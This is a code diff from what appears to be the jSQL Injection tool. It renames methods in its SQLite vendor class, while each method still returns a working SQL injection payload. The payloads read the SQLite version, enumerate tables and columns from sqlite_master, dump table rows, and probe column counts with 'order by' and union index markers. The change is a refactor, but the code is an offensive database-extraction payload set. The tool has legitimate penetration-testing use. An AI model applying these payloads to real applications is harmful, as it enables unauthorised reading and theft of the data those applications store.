@@ -14,31 +14,31 @@ import com.jsql.util.StringUtil;
 
 public class SQLiteVendor extends AbstractVendorDefault {
     @Override
-    public String getSqlInfos() {
+    public String sqlInfos() {
         return
             "select+sqlite_version()||'"+ SEPARATOR_SQL +"'||'sqlite_master'||'"+ SEPARATOR_SQL +"'||'anonymous'||'"+ TRAIL_SQL +"'";
     }
 
     @Override
-    public String getSqlDatabases() {
+    public String sqlDatabases() {
         return
             "select'%04'||r||'%05'||q||'%04"+ TRAIL_SQL +"'from(select'sqlite_master'r,count(*)q+from+sqlite_master+WHERE+type='table'){limit}";
     }
 
     @Override
-    public String getSqlTables(Database database) {
+    public String sqlTables(Database database) {
         return
             "select+group_concat('%04'||name||'%050%04','"+ TD_SQL +"')||'"+ TRAIL_SQL +"'from(select+*+from+sqlite_master+WHERE+type='table'ORDER+BY+tbl_name{limit})";
     }
 
     @Override
-    public String getSqlColumns(Table table) {
+    public String sqlColumns(Table table) {
         return
             "select+sql||'"+ TRAIL_SQL +"'from+sqlite_master+where+tbl_name='"+ table.toString() +"'and+type='table'{limit}";
     }
 
     @Override
-    public String getSqlRows(String[] columns, Database database, Table table) {
+    public String sqlRows(String[] columns, Database database, Table table) {
         // character 7f, last available hexa character (starting at character 80, it gives ?)
         String formatListColumn = StringUtil.join(columns, ",''))||'%7f'||trim(ifnull(");
         
@@ -50,13 +50,13 @@ public class SQLiteVendor extends AbstractVendorDefault {
     }    
 
     @Override
-    public String getSqlNormal(String sqlQuery, String startPosition) {
+    public String sqlNormal(String sqlQuery, String startPosition) {
         return
             "(select'SQLi'||substr((" + sqlQuery + ")," + startPosition + ",65536))";
     }
 
     @Override
-    public String getSqlCapacity(String[] indexes) {
+    public String sqlCapacity(String[] indexes) {
         return
             MediatorModel.model().getIndexesInUrl().replaceAll(
                 "1337(" + StringUtil.join(indexes, "|") + ")7331",
@@ -65,7 +65,7 @@ public class SQLiteVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlIndices(Integer nbFields) {
+    public String sqlIndices(Integer nbFields) {
         List<String> fields = new ArrayList<>(); 
         for (int i = 1 ; i <= nbFields ; i++) {
             fields.add("1337"+ i +"7330%2b1");
@@ -74,12 +74,12 @@ public class SQLiteVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlOrderBy() {
+    public String sqlOrderBy() {
         return "+order+by+1337--+";
     }
 
     @Override
-    public String getSqlLimit(Integer limitSQLResult) {
+    public String sqlLimit(Integer limitSQLResult) {
         return "+limit+65536+offset+" + limitSQLResult;
     }
 }
